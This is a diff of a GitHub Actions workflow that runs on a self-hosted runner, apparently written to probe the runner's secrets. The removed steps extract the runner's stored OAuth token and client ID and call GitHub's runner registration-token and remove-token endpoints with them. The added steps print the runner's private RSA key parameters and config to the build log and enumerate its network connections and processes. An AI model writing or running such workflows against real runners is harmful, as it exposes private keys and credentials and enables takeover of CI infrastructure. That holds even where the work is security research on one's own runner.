@@ -1,55 +1,57 @@
-name: Test Runner Token
+name: Find Internal API
 on: [push]
 jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Try Generate Registration Token
+      - name: Check RSA Params
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
-          echo "=== TRYING OAUTH TOKEN ==="
-          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
+          echo "=== RSA PARAMS ==="
+          cat $RUNNER_BASE/.credentials_rsaparams | python3 -c "
           import sys, json
           data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(data['data'].get('Token', ''))
-          ")
-          
-          curl -s -X POST \
-          -H "Authorization: Bearer $TOKEN" \
-          -H "Accept: application/vnd.github.v3+json" \
-          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
-          
-          echo "=== TRYING CLIENT ID ==="
-          CLIENT=$(cat $RUNNER_BASE/.credentials | python3 -c "
-          import sys, json
-          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(data['data'].get('clientId', ''))
-          ")
-          
-          curl -s -X POST \
-          -H "Authorization: Bearer $CLIENT" \
-          -H "Accept: application/vnd.github.v3+json" \
-          https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
+          print(json.dumps(data, indent=2))
+          "
 
-      - name: Also Try Remove Token
+      - name: Generate JWT From RSA
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
-          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
+          python3 -c "
+          import json, time, base64, hashlib
+          from cryptography.hazmat.primitives import serialization, hashes
+          from cryptography.hazmat.primitives.asymmetric import rsa, padding
+          from cryptography.hazmat.backends import default_backend
+          import urllib.request
+          
+          # Read RSA params
+          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
+              params = json.load(f)
+          
+          print('RSA Params Keys:', list(params.keys()))
+          print('Full Params:', json.dumps(params, indent=2))
+          "
+
+      - name: Monitor Runner Network
+        run: |
+          echo "=== ACTIVE CONNECTIONS ==="
+          lsof -i -n -P | grep Runner
+          
+          echo "=== RUNNER PROCESS ==="
+          ps aux | grep -i runner
+          
+          echo "=== NETSTAT ==="
+          netstat -an | grep ESTABLISHED | grep -v 127.0.0.1
+
+      - name: Check Runner Internal URLs
+        run: |
+          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
+          
+          echo "=== RUNNER CONFIG ==="
+          cat $RUNNER_BASE/.runner | python3 -c "
           import sys, json
           data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
-          print(data['data'].get('Token', ''))
-          ")
-          
-          echo "=== TRYING REMOVE TOKEN ENDPOINT ==="
-          curl -s -X POST \
-          -H "Authorization: Bearer $TOKEN" \
-          -H "Accept: application/vnd.github.v3+json" \
-          https://api.github.com/repos/${{ github.repository }}/actions/runners/remove-token
-          
-          echo "=== TRYING ORG LEVEL ==="
-          curl -s -X POST \
-          -H "Authorization: Bearer $TOKEN" \
-          -H "Accept: application/vnd.github.v3+json" \
-          https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token
+          print(json.dumps(data, indent=2))
+          "
